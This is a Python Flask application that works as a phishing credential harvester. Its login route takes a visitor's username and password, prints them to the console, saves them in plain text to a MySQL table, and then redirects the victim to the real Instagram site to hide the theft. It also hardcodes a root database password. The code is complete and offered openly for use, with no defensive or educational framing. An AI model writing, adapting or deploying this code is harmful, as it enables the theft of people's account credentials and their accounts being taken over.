from flask import Flask, render_template, request, redirect, url_for, flash
import mysql.connector
from mysql.connector import Error
import os

app = Flask(__name__)

# Set the secret key to avoid the RuntimeError
app.secret_key = os.urandom(24)  # This will help avoid session-related issues

# MySQL database connection configuration
db_config = {
    'host': 'localhost',
    'user': 'root',  # Replace with your MySQL username
    'password': 'yoSoyPabloEmilioEscobarGaviria1',  # Replace with your MySQL password
    'database': 'flask_users'  # Your database name
}

# Establish connection to MySQL
def get_db_connection():
    try:
        connection = mysql.connector.connect(**db_config)
        return connection
    except Error as e:
        print(f"Error: {e}")
        return None

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get username and password from the form
        username = request.form['uname']
        password = request.form['password']

        # Debugging: print credentials to terminal
        print(f"Login attempt: Username = {username}, Password = {password}")

        # Open a connection to the database
        conn = get_db_connection()

        if conn:
            try:
                cursor = conn.cursor()

                # Insert credentials into the 'users' table
                insert_query = """
                    INSERT INTO users (username, password)
                    VALUES (%s, %s)
                """
                cursor.execute(insert_query, (username, password))
                conn.commit()

                # Debugging: print to terminal after successful insertion
                print(f"User {username} added to the database.")

                # After successful insertion, redirect to Instagram
                return redirect("https://www.instagram.com")

            except Error as e:
                print(f"Error: {e}")  # Debugging line
            finally:
                # Close the database connection
                conn.close()

        else:
            print("Failed to connect to the database.")  # Debugging line

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
